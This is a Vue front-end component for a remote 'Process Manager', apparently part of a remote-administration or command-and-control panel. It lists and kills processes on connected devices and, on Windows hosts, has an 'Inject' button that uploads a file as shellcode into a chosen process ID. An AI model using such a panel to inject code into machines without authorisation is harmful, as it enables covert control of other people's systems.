<template>
  <el-dialog
    :model-value="open"
    :title="'Process Manager - [' + (device.conn ? device.conn.slice(0,8) : '') + '] ' + device.hostname"
    width="620px"
    draggable
    destroy-on-close
    @open="loadProcesses"
    @close="$emit('cancel')"
  >
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;gap:8px">
      <el-input v-model="filter" placeholder="Filter by name or PID..." clearable size="small" style="flex:1" />
      <el-button :icon="RefreshRight" size="small" @click="loadProcesses">Refresh</el-button>
    </div>

    <el-table
      v-loading="loading"
      :data="displayData"
      :row-key="'pid'"
      :tree-props="treeProps"
      :default-expand-all="false"
      height="400"
      size="small"
      :default-sort="{ prop: 'pid', order: 'ascending' }"
    >
      <el-table-column prop="name" label="Process" min-width="160" show-overflow-tooltip />
      <el-table-column prop="pid"  label="PID"     sortable width="80" />
      <el-table-column prop="ppid" label="PPID"    sortable width="80" />
      <el-table-column label="Actions" width="140">
        <template #default="{ row }">
          <div style="display:flex;gap:4px">
            <el-popconfirm
              title="Kill this process?"
              width="200"
              @confirm="killProcess(row.pid)"
            >
              <template #reference>
                <el-button type="danger" size="small">Kill</el-button>
              </template>
            </el-popconfirm>
            <el-button
              v-if="device.os === 'windows'"
              size="small"
              type="warning"
              @click="openInject(row.pid)"
            >Inject</el-button>
          </div>
        </template>
      </el-table-column>
    </el-table>

    <!-- Hidden file input for shellcode inject -->
    <input ref="injectFileRef" type="file" style="display:none" @change="doInject" />

    <template #footer>
      <el-button @click="$emit('cancel')">Close</el-button>
    </template>
  </el-dialog>
</template>

<script>
import { ref, computed, onMounted } from 'vue';
import { ElMessage } from 'element-plus';
import { RefreshRight } from '@element-plus/icons-vue';
import { request } from '../api/request.js';

function buildTree(flat) {
  const map = {};
  flat.forEach(p => { map[p.pid] = { ...p, children: [] }; });
  const roots = [];
  flat.forEach(p => {
    if (p.ppid && map[p.ppid]) {
      map[p.ppid].children.push(map[p.pid]);
    } else {
      roots.push(map[p.pid]);
    }
  });
  // Strip empty children arrays for cleaner rendering
  function clean(nodes) {
    nodes.forEach(n => {
      if (n.children.length === 0) delete n.children;
      else clean(n.children);
    });
    return nodes;
  }
  return clean(roots);
}

function filterTree(nodes, q) {
  return nodes.reduce((acc, node) => {
    const children = filterTree(node.children || [], q);
    const match = node.name.toLowerCase().includes(q) || String(node.pid).includes(q);
    if (match || children.length) {
      acc.push({ ...node, children: children.length ? children : undefined });
    }
    return acc;
  }, []);
}

export default {
  name: 'ProcessManager',
  props: {
    device: { type: Object, required: true },
    open:   { type: Boolean, default: false },
  },
  emits: ['cancel'],
  setup(props) {
    const loading      = ref(false);
    const processes    = ref([]);
    const filter       = ref('');
    const injectFileRef = ref(null);
    const injectPid    = ref(null);

    const tree = computed(() => buildTree(processes.value));

    const displayData = computed(() => {
      const q = filter.value.trim().toLowerCase();
      if (!q) return tree.value;
      return filterTree(tree.value, q);
    });

    // Use tree-props only when not filtering (tree structure is meaningful)
    const treeProps = computed(() =>
      filter.value.trim() ? null : { children: 'children', hasChildren: 'hasChildren' }
    );

    async function loadProcesses() {
      loading.value = true;
      try {
        const res  = await request('/api/device/process/list', { uuid: props.device.conn });
        const data = res.data;
        if (data.code === 0) {
          processes.value = data.data?.processes ?? [];
        }
      } finally {
        loading.value = false;
      }
    }

    async function killProcess(pid) {
      const res = await request('/api/device/process/kill', { uuid: props.device.conn, pid });
      if (res.data.code === 0) {
        ElMessage.success('Process killed');
        await loadProcesses();
      } else {
        ElMessage.error(res.data.msg || 'Kill failed');
      }
    }

    function openInject(pid) {
      injectPid.value = pid;
      injectFileRef.value.value = '';
      injectFileRef.value.click();
    }

    async function doInject(evt) {
      const file = evt.target.files?.[0];
      if (!file || injectPid.value == null) return;
      const fd = new FormData();
      fd.append('uuid', props.device.conn);
      fd.append('pid', String(injectPid.value));
      fd.append('file', file);
      try {
        const res  = await fetch('./api/device/process/inject', { method: 'POST', body: fd });
        const json = await res.json();
        if (json.code === 0) {
          ElMessage.success(`Shellcode injected into PID ${injectPid.value}`);
        } else {
          ElMessage.error(json.msg || 'Injection failed');
        }
      } catch {
        ElMessage.error('Injection failed');
      } finally {
        injectPid.value = null;
      }
    }

    onMounted(loadProcesses);
    return {
      loading, filter, displayData, treeProps,
      injectFileRef, RefreshRight,
      loadProcesses, killProcess, openInject, doInject,
    };
  },
};
</script>
